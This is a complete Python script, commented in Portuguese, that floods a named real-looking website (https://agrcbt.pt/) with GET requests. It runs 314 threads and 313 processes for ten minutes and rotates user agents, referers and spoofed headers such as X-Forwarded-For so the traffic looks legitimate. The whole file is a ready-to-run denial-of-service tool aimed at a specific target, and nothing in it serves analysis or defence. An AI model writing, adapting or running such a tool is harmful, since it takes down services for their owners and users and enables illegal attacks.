import requests
import threading
import multiprocessing
import random
import time

# Lista de user agents e referers
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"
]

referers = [
    "http://www.google.com",
    "http://www.bing.com",
    "http://www.yahoo.com",
    "http://www.duckduckgo.com",
    "http://www.ask.com",
    "http://www.aol.com"
]

# Função de ataque com ofuscação e autenticação de cookies
def flood(target_url, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            user_agent = random.choice(user_agents)
            referer = random.choice(referers)
            headers = {
                "User-Agent": user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache",
                "Connection": "keep-alive",
                "Referer": referer,
                "Pragma": "no-cache",
                "Upgrade-Insecure-Requests": "1"
            }
            # Adiciona cabeçalhos extras de ofuscação
            headers["X-Requested-With"] = "XMLHttpRequest"
            headers["Origin"] = "http://example.com"
            headers["DNT"] = "1"
            headers["X-Forwarded-For"] = "127.0.0.1"

            # Autenticação de cookies
            cookies = {
                "sessionid": "1234567890abcdef"
            }
            
            with requests.Session() as session:
                session.headers = headers
                session.cookies.update(cookies)
                response = session.get(target_url)
                print(f"Request sent to {target_url}, Response code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

# Configurações do ataque
target_url = "https://agrcbt.pt/"
duration = 600
num_threads = 314
num_processes = 313

# Inicia os threads e processos
threads = []
processes = []
for _ in range(num_threads):
    thread = threading.Thread(target=flood, args=(target_url, duration))
    threads.append(thread)
    thread.start()

for _ in range(num_processes):
    process = multiprocessing.Process(target=flood, args=(target_url, duration))
    processes.append(process)
    process.start()

# Aguarda os threads e processos terminarem
for thread in threads:
    thread.join()

for process in processes:
    process.join()